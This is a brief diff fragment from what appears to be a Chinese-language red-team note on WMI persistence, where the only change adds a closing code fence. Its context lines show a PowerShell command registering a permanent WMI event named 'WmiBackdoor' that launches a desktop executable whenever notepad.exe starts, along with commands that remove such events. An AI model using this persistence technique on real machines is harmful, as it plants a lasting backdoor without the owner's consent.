@@ -125,7 +125,7 @@ Get-WmiEvent -Name RedTeamEvent | Remove-WmiObject
 Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Users\lsc\Desktop\http.exe" -Trigger ProcessStart -ProcessName notepad.exe
 #清除恶意 WMI 事件（名称为WmiBackdoor）
 Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
-
+```
 
 
 
